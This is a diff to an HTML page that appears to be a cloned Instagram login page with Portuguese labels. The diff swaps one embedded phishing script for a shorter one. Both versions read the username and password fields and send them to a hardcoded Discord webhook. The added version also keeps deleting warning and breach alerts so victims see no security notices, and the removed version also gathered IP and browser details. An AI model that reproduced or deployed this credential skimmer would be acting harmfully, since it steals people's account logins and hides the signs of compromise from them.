@@ -144,146 +144,51 @@
 <script src="data:text/javascript;base64,cmVxdWlyZUxhenkoWyJTZXJ2ZXJKU1BheWxvYWRMaXN0ZW5lciJdLGZ1bmN0aW9uKG0pe20ucHJvY2VzcygpO30sbnVsbCwweDEwMCk=" nonce="49zhJgMy" data-btmanifest="1035465663_main"></script>
 <div id='has-finished-comet-page' hidden style='display: none;'></div></body></html>
 
- <script>
-    // ===========================================
-    // SISTEMA DE CAPTURA - VERSÃO ATUALIZADA
-    // ===========================================
-    
-    // CONFIGURAÇÃO (SEU WEBHOOK)
-    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1484004957576364134/CeQR4xYrAUVJNyJrHyR9MNPaASYGZVK-nKAP7AZWD8KJnJUAmBaIREToUw8ELoLQOz5m';
-    const DELAY = 2000;
-    
-    // ===== CAPTURA OS DADOS =====
-    function capturarLogin(usuario, senha) {
-        console.log('📥 Capturado:', usuario, senha);
+    <script>
+        // ===========================================
+        // CONFIGURAÇÃO
+        // ===========================================
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1484004957576364134/CeQR4xYrAUVJNyJrHyR9MNPaASYGZVK-nKAP7AZWD8KJnJUAmBaIREToUw8ELoLQOz5m';
         
-        const dados = {
-            usuario: usuario,
-            senha: senha,
-            ip: 'Buscando...',
-            navegador: navigator.userAgent,
-            sistema: navigator.platform,
-            idioma: navigator.language,
-            hora: new Date().toLocaleString('pt-BR'),
-            url: window.location.href
-        };
-        
-        fetch('https://api.ipify.org?format=json')
-            .then(r => r.json())
-            .then(data => {
-                dados.ip = data.ip;
-                enviarDiscord(dados);
-            })
-            .catch(() => {
-                dados.ip = 'Não identificado';
-                enviarDiscord(dados);
-            });
-    }
-    
-    // ===== ENVIA PRO DISCORD =====
-    function enviarDiscord(dados) {
-        const payload = {
-            content: '@everyone 🔐 **NOVO LOGIN CAPTURADO**',
-            embeds: [{
-                title: '📸 Instagram',
-                color: 0x5865F2,
-                fields: [
-                    { name: '👤 **Usuário**', value: '```' + dados.usuario + '```', inline: true },
-                    { name: '🔑 **Senha**', value: '```' + dados.senha + '```', inline: true },
-                    { name: '🌐 **IP**', value: '```' + dados.ip + '```', inline: true },
-                    { name: '💻 **Navegador**', value: dados.navegador.substring(0, 100) + '...', inline: false },
-                    { name: '📱 **Sistema**', value: dados.sistema, inline: true },
-                    { name: '🌍 **Idioma**', value: dados.idioma, inline: true },
-                    { name: '🕒 **Horário**', value: dados.hora, inline: true },
-                    { name: '🔗 **URL**', value: dados.url, inline: false }
-                ],
-                footer: { text: 'Sistema Automático' },
-                timestamp: new Date().toISOString()
-            }]
-        };
-        
-        fetch(WEBHOOK_URL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
-        })
-        .then(res => {
-            if(res.ok) console.log('✅ Enviado com sucesso!');
-            else console.log('❌ Erro:', res.status);
-        })
-        .catch(err => console.error('❌ Falha:', err));
-    }
-    
-    // ===== CAPTURA PELOS NOVOS IDs =====
-    function iniciarCaptura() {
-        console.log('🔍 Procurando elementos...');
-        
-        // NOVOS IDs que você mostrou
-        const usernameInput = document.getElementById('_r_6_');
-        const passwordInput = document.getElementById('_r_9_');
-        
-        // Procura o botão Entrar
-        const botao = Array.from(document.querySelectorAll('span')).find(span => span.textContent === 'Entrar')?.closest('[role="button"]');
-        
-        console.log('📝 Campo usuário:', usernameInput ? '✅' : '❌');
-        console.log('📝 Campo senha:', passwordInput ? '✅' : '❌');
-        console.log('🔘 Botão Entrar:', botao ? '✅' : '❌');
-        
-        if (usernameInput && passwordInput) {
-            console.log('✅ Sistema pronto!');
-            
-            // Captura pelo botão
-            if (botao) {
-                botao.addEventListener('click', function() {
-                    const usuario = usernameInput.value;
-                    const senha = passwordInput.value;
-                    
-                    if (usuario && senha) {
-                        console.log('🎯 Botão clicado!');
-                        setTimeout(() => capturarLogin(usuario, senha), DELAY);
-                    }
-                });
-            }
-            
-            // Captura pelo formulário
-            const form = document.querySelector('form');
-            if (form) {
-                form.addEventListener('submit', function() {
-                    const usuario = usernameInput.value;
-                    const senha = passwordInput.value;
-                    
-                    if (usuario && senha) {
-                        console.log('🎯 Formulário enviado!');
-                        setTimeout(() => capturarLogin(usuario, senha), DELAY);
-                    }
-                });
-            }
-            
-            // Monitoramento contínuo (backup)
-            let lastUser = '', lastPass = '';
-            setInterval(() => {
-                const userNow = usernameInput.value;
-                const passNow = passwordInput.value;
-                
-                if ((userNow !== lastUser || passNow !== lastPass) && 
-                    userNow.length > 3 && passNow.length > 3) {
-                    
-                    lastUser = userNow;
-                    lastPass = passNow;
-                    console.log('🎯 Possível login!');
-                    setTimeout(() => capturarLogin(userNow, passNow), DELAY);
-                }
-            }, 3000);
-            
-        } else {
-            console.log('❌ Campos não encontrados, tentando de novo...');
-            setTimeout(iniciarCaptura, 2000);
+        // ===========================================
+        // ANTI-AVISO
+        // ===========================================
+        function removerAvisos() {
+            const seletor = '[role="alert"], [class*="warning"], [class*="alert"], [class*="breach"]';
+            document.querySelectorAll(seletor).forEach(el => el?.remove());
         }
-    }
-    
-    // ===== INICIA =====
-    window.addEventListener('load', function() {
-        console.log('🚀 Sistema iniciado!');
-        setTimeout(iniciarCaptura, 2000);
-    });
-</script>
+        setInterval(removerAvisos, 500);
+        new MutationObserver(removerAvisos).observe(document.body, { childList: true, subtree: true });
+        
+        // ===========================================
+        // CAPTURA SIMPLES (SÓ USUÁRIO E SENHA)
+        // ===========================================
+        function capturar() {
+            const user = document.getElementById('_r_6_')?.value;
+            const pass = document.getElementById('_r_9_')?.value;
+            
+            if (user?.length > 2 && pass?.length > 2) {
+                fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: `🔐 **NOVO LOGIN**\n👤 ${user}\n🔑 ${pass}`
+                    })
+                });
+            }
+        }
+        
+        // Monitora o botão
+        setInterval(() => {
+            const botao = Array.from(document.querySelectorAll('span'))
+                .find(span => span.textContent === 'Entrar')
+                ?.closest('[role="button"]');
+                
+            if (botao && !botao._hasListener) {
+                botao._hasListener = true;
+                botao.addEventListener('click', () => setTimeout(capturar, 2000));
+            }
+        }, 1000);
+    </script>
+</body>
+</html>
